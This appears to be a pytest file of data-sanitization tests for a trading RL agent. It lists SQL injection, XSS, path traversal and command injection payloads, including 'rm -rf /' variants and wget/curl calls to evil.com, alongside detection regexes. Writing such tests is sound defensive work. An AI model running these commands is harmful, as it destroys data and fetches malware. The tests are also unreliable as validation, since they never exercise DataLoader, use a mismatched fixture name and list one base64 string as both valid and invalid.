"""Security tests for data sanitization in trading RL agent."""

import base64
import html
import json
import re
from unittest.mock import Mock

import numpy as np
import pandas as pd
import pytest

from src.trade_agent.data.data_loader import DataLoader


class TestDataSanitizationSecurity:
    """Test data sanitization security measures."""

    @pytest.fixture
    def mock_data_loader(self) -> DataLoader:
        """Create a mock data loader for testing."""
        return Mock(spec=DataLoader)

    def test_sql_injection_sanitization(self, _mock_data_loader):
        """Test SQL injection sanitization."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "'; UPDATE users SET password='hacked'; --",
            "'; DELETE FROM users; --",
            "'; EXEC xp_cmdshell('dir'); --",
            "'; SELECT * FROM information_schema.tables; --",
            "'; UNION SELECT * FROM users; --",
            "'; WAITFOR DELAY '00:00:10'; --",
            "'; IF 1=1 SELECT 'hacked'; --",
        ]

        for malicious_input in malicious_inputs:
            # Test SQL injection detection
            sql_keywords = [
                "SELECT",
                "INSERT",
                "UPDATE",
                "DELETE",
                "DROP",
                "CREATE",
                "ALTER",
                "EXEC",
                "EXECUTE",
                "UNION",
                "WAITFOR",
                "IF",
                "CASE",
                "WHEN",
                "THEN",
                "ELSE",
                "END",
                "BEGIN",
                "TRANSACTION",
                "COMMIT",
                "ROLLBACK",
            ]

            detected_keywords = [keyword for keyword in sql_keywords if keyword.lower() in malicious_input.lower()]

            with pytest.raises(ValueError):
                if detected_keywords:
                    raise ValueError(f"SQL injection detected: {detected_keywords}")

    def test_xss_sanitization(self, _mock_data_loader):
        """Test XSS sanitization."""
        malicious_scripts = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "onload=alert('xss')",
            "onerror=alert('xss')",
            "onclick=alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<object data=javascript:alert('xss')></object>",
            "<embed src=javascript:alert('xss')>",
            "<form action=javascript:alert('xss')><input type=submit></form>",
            "<link rel=stylesheet href=javascript:alert('xss')>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<div onmouseover=alert('xss')>hover me</div>",
            "<input onfocus=alert('xss')>",
            "<textarea onblur=alert('xss')></textarea>",
            "<select onchange=alert('xss')><option>test</option></select>",
            "<button onsubmit=alert('xss')>submit</button>",
        ]

        for malicious_script in malicious_scripts:
            # Test XSS detection
            xss_patterns = [
                r"<script[^>]*>.*?</script>",
                r"javascript:",
                r"on\w+\s*=",
                r"<iframe[^>]*>",
                r"<object[^>]*>",
                r"<embed[^>]*>",
                r"<form[^>]*>",
                r"<link[^>]*>",
                r"<meta[^>]*>",
            ]

            detected_xss = False
            for pattern in xss_patterns:
                if re.search(pattern, malicious_script, re.IGNORECASE):
                    detected_xss = True
                    break

            with pytest.raises(ValueError):
                if detected_xss:
                    raise ValueError(f"XSS attempt detected: {malicious_script}")

    def test_html_encoding(self, _mock_data_loader):
        """Test HTML encoding for safe output."""
        test_inputs = [
            "<script>alert('xss')</script>",
            "Hello & World",
            "Price: $100 < $200",
            "User input: <img src=x onerror=alert('xss')>",
            "Special chars: & < > \" '",
        ]

        for test_input in test_inputs:
            # HTML encode the input
            encoded = html.escape(test_input)

            # Verify encoding
            assert (
                "&lt;" in encoded
                or "&gt;" in encoded
                or "&amp;" in encoded
                or "&quot;" in encoded
                or "&#x27;" in encoded
            )

            # Verify no script tags in encoded output
            assert "<script>" not in encoded.lower()
            assert "javascript:" not in encoded.lower()

    def test_path_traversal_sanitization(self, _mock_data_loader):
        """Test path traversal sanitization."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
            "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",
        ]

        for malicious_path in malicious_paths:
            # Test path traversal detection
            path_traversal_patterns = [
                r"\.\./",
                r"\.\.\\",
                r"\.\.%2F",
                r"\.\.%5C",
                r"\.\.%2f",
                r"\.\.%5c",
                r"\.\.%252F",
                r"\.\.%255C",
                r"\.\.%252f",
                r"\.\.%255c",
            ]

            detected_traversal = False
            for pattern in path_traversal_patterns:
                if re.search(pattern, malicious_path, re.IGNORECASE):
                    detected_traversal = True
                    break

            with pytest.raises(ValueError):
                if detected_traversal:
                    raise ValueError(f"Path traversal detected: {malicious_path}")

    def test_command_injection_sanitization(self, _mock_data_loader):
        """Test command injection sanitization."""
        malicious_commands = [
            "; rm -rf /",
            "& del /s /q C:\\",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "&& echo 'hacked'",
            "|| echo 'hacked'",
            "; ls -la",
            "& dir",
            "| grep password",
            "`cat /etc/shadow`",
            "$(wget http://evil.com/malware)",
            "&& curl http://evil.com/malware",
            "|| nc -l 4444",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            '& powershell -Command "Remove-Item C:\\ -Recurse -Force"',
            '| bash -c "rm -rf /"',
            "`perl -e 'system(\"rm -rf /\")'`",
            "$(ruby -e 'system(\"rm -rf /\")')",
            "&& node -e \"require('fs').rmSync('/', {recursive: true})\"",
        ]

        for malicious_command in malicious_commands:
            # Test command injection detection
            command_patterns = [
                r"[;&|`$]",
                r"&&|\|\|",
                r"rm\s+-rf",
                r"del\s+/s\s+/q",
                r"cat\s+/etc/",
                r"whoami",
                r"id",
                r"ls\s+-la",
                r"dir",
                r"grep\s+password",
                r"wget\s+http://",
                r"curl\s+http://",
                r"nc\s+-l",
                r"python\s+-c",
                r"powershell\s+-Command",
                r"bash\s+-c",
                r"perl\s+-e",
                r"ruby\s+-e",
                r"node\s+-e",
            ]

            detected_injection = False
            for pattern in command_patterns:
                if re.search(pattern, malicious_command, re.IGNORECASE):
                    detected_injection = True
                    break

            with pytest.raises(ValueError):
                if detected_injection:
                    raise ValueError(f"Command injection detected: {malicious_command}")

    def test_numeric_data_sanitization(self, _mock_data_loader):
        """Test numeric data sanitization."""
        # Test valid numeric data
        valid_numerics = [
            0,
            1,
            100,
            1000.5,
            -1,
            -100.5,
            np.nan,
            np.inf,
            -np.inf,
            pd.NA,
            pd.NaT,
        ]

        for numeric in valid_numerics:
            # Test numeric validation
            if pd.isna(numeric):
                # Handle NaN/NA values
                assert pd.isna(numeric)
            elif np.isinf(numeric):
                # Handle infinity values
                assert np.isinf(numeric)
            else:
                # Handle regular numbers
                assert isinstance(numeric, int | float)

        # Test invalid numeric data
        invalid_numerics = [
            "not_a_number",
            "123abc",
            "abc123",
            "",
            None,
            [],
            {},
            "NaN",
            "Infinity",
            "-Infinity",
        ]

        for invalid_numeric in invalid_numerics:
            with pytest.raises((ValueError, TypeError)):
                if isinstance(invalid_numeric, str):
                    if invalid_numeric.lower() in ["nan", "infinity", "-infinity"]:
                        raise ValueError(f"Invalid numeric string: {invalid_numeric}")
                    float(invalid_numeric)
                else:
                    float(invalid_numeric)

    def test_string_data_sanitization(self, _mock_data_loader):
        """Test string data sanitization."""
        # Test valid strings
        valid_strings = [
            "Hello World",
            "AAPL",
            "123.45",
            "user@example.com",
            "https://example.com",
            "2023-01-01",
        ]

        for string in valid_strings:
            # Test string validation
            assert isinstance(string, str)
            assert len(string) > 0
            assert len(string) <= 1000  # Reasonable max length

        # Test invalid strings
        invalid_strings = [
            "",  # Empty string
            "A" * 1001,  # Too long
            None,  # None value
            123,  # Non-string
            [],  # List
            {},  # Dict
        ]

        for invalid_string in invalid_strings:
            with pytest.raises((ValueError, TypeError, AttributeError)):
                if invalid_string is None:
                    raise ValueError("String cannot be None")
                if isinstance(invalid_string, str):
                    if len(invalid_string) == 0:
                        raise ValueError("String cannot be empty")
                    if len(invalid_string) > 1000:
                        raise ValueError("String too long")
                else:
                    str(invalid_string)  # This should work, but we're testing validation

    def test_json_data_sanitization(self, _mock_data_loader):
        """Test JSON data sanitization."""
        # Test valid JSON
        valid_jsons = [
            '{"key": "value"}',
            '{"numbers": [1, 2, 3]}',
            '{"nested": {"key": "value"}}',
            '{"boolean": true, "null": null}',
            '{"string": "Hello World"}',
        ]

        for json_str in valid_jsons:
            try:
                parsed = json.loads(json_str)
                # Re-serialize to ensure it's valid
                json.dumps(parsed)
            except json.JSONDecodeError:
                pytest.fail(f"Valid JSON {json_str} was rejected")

        # Test invalid JSON
        invalid_jsons = [
            '{"key": "value"',  # Missing closing brace
            '{"key": value}',  # Missing quotes
            '{"key": "value",}',  # Trailing comma
            "not_json",
            "",
            None,
            '{"key": "value", "key": "duplicate"}',  # Duplicate keys
        ]

        for json_str in invalid_jsons:
            with pytest.raises((json.JSONDecodeError, TypeError, ValueError)):
                if json_str is None:
                    raise ValueError("JSON string cannot be None")
                json.loads(json_str)

    def test_url_sanitization(self, _mock_data_loader):
        """Test URL sanitization."""
        # Test valid URLs
        valid_urls = [
            "https://api.example.com",
            "http://localhost:8000",
            "https://data.example.com/v1/endpoint",
            "https://example.com/path?param=value",
            "https://example.com/path#fragment",
        ]

        for url in valid_urls:
            # Test URL validation
            assert url.startswith(("http://", "https://"))
            assert len(url) > 0
            assert len(url) <= 2048  # Reasonable max URL length

        # Test invalid URLs
        invalid_urls = [
            "",  # Empty
            "not_a_url",  # No protocol
            "ftp://example.com",  # Unsupported protocol
            "file:///etc/passwd",  # File protocol
            "javascript:alert('xss')",  # JavaScript protocol
            "data:text/html,<script>alert('xss')</script>",  # Data protocol
            "A" * 2049,  # Too long
            None,  # None
        ]

        for url in invalid_urls:
            with pytest.raises(ValueError):
                if not url:
                    raise ValueError("URL cannot be empty")
                if not url.startswith(("http://", "https://")):
                    raise ValueError(f"Invalid URL protocol: {url}")
                if len(url) > 2048:
                    raise ValueError("URL too long")

    def test_email_sanitization(self, _mock_data_loader):
        """Test email sanitization."""
        # Test valid emails
        valid_emails = [
            "user@example.com",
            "user.name@example.com",
            "user+tag@example.com",
            "user123@example.co.uk",
            "user@subdomain.example.com",
        ]

        for email in valid_emails:
            # Test email validation
            email_pattern = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
            assert re.match(email_pattern, email)

        # Test invalid emails
        invalid_emails = [
            "",  # Empty
            "not_an_email",  # No @
            "@example.com",  # No local part
            "user@",  # No domain
            "user@.com",  # No domain name
            "user@example",  # No TLD
            "user..name@example.com",  # Double dots
            "user@example..com",  # Double dots in domain
            "user@example.com.",  # Trailing dot
            ".user@example.com",  # Leading dot
            "user name@example.com",  # Space
            "user@example com",  # Space in domain
            "user@example.com\n",  # Newline
            "user@example.com\r",  # Carriage return
            "user@example.com\t",  # Tab
        ]

        for email in invalid_emails:
            with pytest.raises(ValueError):
                if not email:
                    raise ValueError("Email cannot be empty")
                email_pattern = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
                if not re.match(email_pattern, email):
                    raise ValueError(f"Invalid email format: {email}")

    def test_file_extension_sanitization(self, _mock_data_loader):
        """Test file extension sanitization."""
        # Test valid file extensions
        valid_extensions = [
            ".csv",
            ".json",
            ".yaml",
            ".yml",
            ".parquet",
            ".h5",
            ".hdf5",
            ".txt",
            ".log",
        ]

        for ext in valid_extensions:
            # Test extension validation
            assert ext.startswith(".")
            assert len(ext) > 1
            assert len(ext) <= 10
            assert all(c.isalnum() or c == "." for c in ext)

        # Test invalid file extensions
        invalid_extensions = [
            "",  # Empty
            ".",  # Just dot
            ".exe",  # Executable
            ".bat",  # Batch file
            ".sh",  # Shell script
            ".py",  # Python file
            ".js",  # JavaScript
            ".html",  # HTML
            ".php",  # PHP
            ".asp",  # ASP
            ".jsp",  # JSP
            ".jar",  # Java archive
            ".war",  # Web archive
            ".ear",  # Enterprise archive
            ".dll",  # Dynamic library
            ".so",  # Shared object
            ".dylib",  # Dynamic library (macOS)
            ".bin",  # Binary
            ".com",  # Command
            ".cmd",  # Command
            ".ps1",  # PowerShell
            ".vbs",  # VBScript
            ".wsf",  # Windows Script
            ".msi",  # Microsoft Installer
            ".pkg",  # Package
            ".deb",  # Debian package
            ".rpm",  # RPM package
            ".app",  # Application
            ".dmg",  # Disk image
            ".iso",  # ISO image
        ]

        for ext in invalid_extensions:
            with pytest.raises(ValueError):
                if not ext:
                    raise ValueError("File extension cannot be empty")
                if ext in [
                    ".exe",
                    ".bat",
                    ".sh",
                    ".py",
                    ".js",
                    ".html",
                    ".php",
                    ".asp",
                    ".jsp",
                    ".jar",
                    ".war",
                    ".ear",
                    ".dll",
                    ".so",
                    ".dylib",
                    ".bin",
                    ".com",
                    ".cmd",
                    ".ps1",
                    ".vbs",
                    ".wsf",
                    ".msi",
                    ".pkg",
                    ".deb",
                    ".rpm",
                    ".app",
                    ".dmg",
                    ".iso",
                ]:
                    raise ValueError(f"Invalid file extension: {ext}")

    def test_base64_sanitization(self, _mock_data_loader):
        """Test base64 data sanitization."""
        # Test valid base64
        valid_base64 = [
            "SGVsbG8gV29ybGQ=",  # "Hello World"
            "dXNlcjpwYXNzd29yZA==",  # "user:password"
            "ZGF0YQ==",  # "data"
        ]

        for b64_str in valid_base64:
            try:
                decoded = base64.b64decode(b64_str)
                # Re-encode to ensure it's valid
                re_encoded = base64.b64encode(decoded).decode()
                assert re_encoded == b64_str
            except Exception:
                pytest.fail(f"Valid base64 {b64_str} was rejected")

        # Test invalid base64
        invalid_base64 = [
            "",  # Empty
            "not_base64",  # Invalid characters
            "SGVsbG8gV29ybGQ",  # Missing padding
            "SGVsbG8gV29ybGQ==",  # Extra padding
            "SGVsbG8gV29ybGQ!",  # Invalid character
            "SGVsbG8gV29ybGQ@",  # Invalid character
            "SGVsbG8gV29ybGQ#",  # Invalid character
            "SGVsbG8gV29ybGQ$",  # Invalid character
            "SGVsbG8gV29ybGQ%",  # Invalid character
            "SGVsbG8gV29ybGQ^",  # Invalid character
            "SGVsbG8gV29ybGQ&",  # Invalid character
            "SGVsbG8gV29ybGQ*",  # Invalid character
            "SGVsbG8gV29ybGQ(",  # Invalid character
            "SGVsbG8gV29ybGQ)",  # Invalid character
            "SGVsbG8gV29ybGQ-",  # Invalid character
            "SGVsbG8gV29ybGQ+",  # Invalid character
            "SGVsbG8gV29ybGQ=",  # Invalid character
            "SGVsbG8gV29ybGQ[",  # Invalid character
            "SGVsbG8gV29ybGQ]",  # Invalid character
            "SGVsbG8gV29ybGQ{",  # Invalid character
            "SGVsbG8gV29ybGQ}",  # Invalid character
            "SGVsbG8gV29ybGQ|",  # Invalid character
            "SGVsbG8gV29ybGQ\\",  # Invalid character
            "SGVsbG8gV29ybGQ/",  # Invalid character
            "SGVsbG8gV29ybGQ:",  # Invalid character
            "SGVsbG8gV29ybGQ;",  # Invalid character
            "SGVsbG8gV29ybGQ'",  # Invalid character
            'SGVsbG8gV29ybGQ"',  # Invalid character
            "SGVsbG8gV29ybGQ,",  # Invalid character
            "SGVsbG8gV29ybGQ.",  # Invalid character
            "SGVsbG8gV29ybGQ<",  # Invalid character
            "SGVsbG8gV29ybGQ>",  # Invalid character
            "SGVsbG8gV29ybGQ?",  # Invalid character
        ]

        for b64_str in invalid_base64:
            with pytest.raises((ValueError, TypeError)):
                if not b64_str:
                    raise ValueError("Base64 string cannot be empty")
                base64.b64decode(b64_str)

    def test_xml_sanitization(self, _mock_data_loader):
        """Test XML data sanitization."""
        # Test valid XML
        valid_xmls = [
            "<root><item>value</item></root>",
            "<data><name>John</name><age>30</age></data>",
            "<config><setting>enabled</setting></config>",
        ]

        for xml_str in valid_xmls:
            # Test XML validation (basic)
            assert xml_str.startswith("<")
            assert xml_str.endswith(">")
            assert xml_str.count("<") == xml_str.count(">")

        # Test invalid XML
        invalid_xmls = [
            "",  # Empty
            "not_xml",  # No tags
            "<root><item>value</root>",  # Unclosed tag
            "<root><item>value</item>",  # Missing closing root
            "<root><item>value</item></wrong>",  # Wrong closing tag
            "<script>alert('xss')</script>",  # Script tag
            "<iframe src=javascript:alert('xss')></iframe>",  # Iframe
            "<object data=javascript:alert('xss')></object>",  # Object
            "<embed src=javascript:alert('xss')>",  # Embed
            "<form action=javascript:alert('xss')><input type=submit></form>",  # Form
        ]

        for xml_str in invalid_xmls:
            with pytest.raises(ValueError):
                if not xml_str:
                    raise ValueError("XML string cannot be empty")
                if not xml_str.startswith("<") or not xml_str.endswith(">"):
                    raise ValueError("Invalid XML format")
                if xml_str.count("<") != xml_str.count(">"):
                    raise ValueError("Mismatched XML tags")
                # Check for dangerous tags
                dangerous_tags = ["<script", "<iframe", "<object", "<embed", "<form"]
                if any(tag in xml_str.lower() for tag in dangerous_tags):
                    raise ValueError("Dangerous XML tags detected")

    def test_csv_sanitization(self, _mock_data_loader):
        """Test CSV data sanitization."""
        # Test valid CSV
        valid_csvs = [
            "name,age,city\nJohn,30,New York\nJane,25,Boston",
            "symbol,price,volume\nAAPL,150.50,1000000\nGOOGL,2800.75,500000",
            "date,open,high,low,close\n2023-01-01,100.00,105.00,99.00,103.50",
        ]

        for csv_str in valid_csvs:
            # Test CSV validation (basic)
            lines = csv_str.split("\n")
            assert len(lines) > 0
            assert "," in lines[0]  # Header should have commas

        # Test invalid CSV
        invalid_csvs = [
            "",  # Empty
            "not_csv",  # No commas
            "name,age,city\nJohn,30",  # Inconsistent columns
            "name,age,city\nJohn,30,New York\nJane,25",  # Inconsistent columns
            "name,age,city\nJohn,30,New York\nJane,25,Boston\n",  # Extra newline
        ]

        for csv_str in invalid_csvs:
            with pytest.raises(ValueError):
                if not csv_str:
                    raise ValueError("CSV string cannot be empty")
                lines = csv_str.split("\n")
                if len(lines) < 2:
                    raise ValueError("CSV must have at least header and one data row")
                header_columns = len(lines[0].split(","))
                for line in lines[1:]:
                    if line and len(line.split(",")) != header_columns:
                        raise ValueError("Inconsistent number of columns")

    def test_dataframe_sanitization(self, _mock_data_loader):
        """Test DataFrame sanitization."""
        # Test valid DataFrames
        valid_dfs = [
            pd.DataFrame({"A": [1, 2, 3], "B": [4, 5, 6]}),
            pd.DataFrame({"symbol": ["AAPL", "GOOGL"], "price": [150.50, 2800.75]}),
            pd.DataFrame({"date": pd.date_range("2023-01-01", periods=5)}),
        ]

        for df in valid_dfs:
            # Test DataFrame validation
            assert isinstance(df, pd.DataFrame)
            assert len(df) > 0
            assert len(df.columns) > 0
            assert not df.empty

        # Test invalid DataFrames
        invalid_dfs = [
            pd.DataFrame(),  # Empty DataFrame
            pd.DataFrame({}),  # Empty DataFrame with no columns
            None,  # None
        ]

        for df in invalid_dfs:
            with pytest.raises((ValueError, AttributeError)):
                if df is None:
                    raise ValueError("DataFrame cannot be None")
                if df.empty:
                    raise ValueError("DataFrame cannot be empty")

    def test_numeric_range_sanitization(self, _mock_data_loader):
        """Test numeric range sanitization."""
        # Test valid numeric ranges
        valid_ranges = [
            (0, 100),
            (-100, 100),
            (0.0, 1.0),
            (-1.0, 1.0),
            (1e-6, 1e6),
        ]

        for min_val, max_val in valid_ranges:
            # Test range validation
            assert min_val <= max_val
            assert isinstance(min_val, int | float)
            assert isinstance(max_val, int | float)

        # Test invalid numeric ranges
        invalid_ranges = [
            (100, 0),  # Min > Max
            (None, 100),  # None min
            (0, None),  # None max
            ("0", 100),  # String min
            (0, "100"),  # String max
            (float("inf"), 100),  # Infinity min
            (0, float("inf")),  # Infinity max
            (float("-inf"), 100),  # Negative infinity min
            (0, float("-inf")),  # Negative infinity max
        ]

        for min_val, max_val in invalid_ranges:
            with pytest.raises(ValueError):
                if min_val is None or max_val is None:
                    raise ValueError("Range values cannot be None")
                if not isinstance(min_val, int | float) or not isinstance(max_val, int | float):
                    raise ValueError("Range values must be numeric")
                if min_val > max_val:
                    raise ValueError("Min value cannot be greater than max value")
                if np.isinf(min_val) or np.isinf(max_val):
                    raise ValueError("Range values cannot be infinite")

    def test_whitespace_sanitization(self, _mock_data_loader):
        """Test whitespace sanitization."""
        # Test whitespace removal
        test_strings = [
            "  Hello World  ",
            "\tTab separated\t",
            "\nNew line\n",
            "\rCarriage return\r",
            "  \t\n\r  Mixed whitespace  \t\n\r  ",
        ]

        for test_string in test_strings:
            # Test whitespace removal
            cleaned = test_string.strip()
            assert not cleaned.startswith((" ", "\t", "\n", "\r"))
            assert not cleaned.endswith((" ", "\t", "\n", "\r"))

        # Test whitespace normalization
        test_strings_with_spaces = [
            "Hello    World",  # Multiple spaces
            "Hello\t\tWorld",  # Multiple tabs
            "Hello\n\nWorld",  # Multiple newlines
            "Hello\r\rWorld",  # Multiple carriage returns
        ]

        for test_string in test_strings_with_spaces:
            # Test whitespace normalization
            normalized = re.sub(r"\s+", " ", test_string)
            assert normalized.count(" ") <= test_string.count(" ") + 1  # At most one space between words

    def test_encoding_sanitization(self, _mock_data_loader):
        """Test encoding sanitization."""
        # Test valid encodings
        valid_encodings = ["utf-8", "ascii", "latin-1", "iso-8859-1"]
        test_string = "Hello World"

        for encoding in valid_encodings:
            try:
                encoded = test_string.encode(encoding)
                decoded = encoded.decode(encoding)
                assert decoded == test_string
            except (LookupError, UnicodeError):
                pytest.fail(f"Valid encoding {encoding} was rejected")

        # Test invalid encodings
        invalid_encodings = [
            "invalid_encoding",
            "not_an_encoding",
            "",
            None,
        ]

        for encoding in invalid_encodings:
            with pytest.raises((LookupError, TypeError)):
                test_string.encode(encoding)

    def test_special_character_sanitization(self, _mock_data_loader):
        """Test special character sanitization."""
        # Test special character removal
        test_strings = [
            "Hello\nWorld",  # Newline
            "Hello\rWorld",  # Carriage return
            "Hello\tWorld",  # Tab
            "Hello\0World",  # Null byte
            "Hello\x00World",  # Null byte (hex)
            "Hello\x01World",  # Control character
            "Hello\x7fWorld",  # Control character
        ]

        for test_string in test_strings:
            # Test control character removal
            cleaned = re.sub(r"[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]", "", test_string)
            assert "\x00" not in cleaned
            assert "\x01" not in cleaned
            assert "\x7f" not in cleaned

        # Test HTML entity encoding
        test_strings_with_html = [
            "Hello & World",
            "Price: $100 < $200",
            "User input: <script>alert('xss')</script>",
            "Special chars: & < > \" '",
        ]

        for test_string in test_strings_with_html:
            # Test HTML entity encoding
            encoded = html.escape(test_string)
            assert (
                "&amp;" in encoded
                or "&lt;" in encoded
                or "&gt;" in encoded
                or "&quot;" in encoded
                or "&#x27;" in encoded
            )
